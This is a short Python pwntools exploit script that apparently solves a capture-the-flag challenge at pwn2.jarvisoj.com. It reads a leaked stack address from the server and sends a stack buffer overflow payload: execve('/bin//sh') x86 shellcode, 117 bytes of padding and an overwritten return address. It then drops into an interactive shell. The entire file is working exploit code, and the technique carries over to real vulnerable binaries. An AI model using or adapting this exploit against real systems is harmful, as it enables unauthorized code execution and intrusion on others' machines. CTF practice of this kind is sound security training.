#!/usr/bin/env python
# coding=utf-8
from pwn import*

s=remote('pwn2.jarvisoj.com',9877)

address=int(s.recvline()[-10:-2],16)
shellcode='\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'
payload=shellcode+'A'*117+p32(address)

s.sendline(payload)

s.interactive()

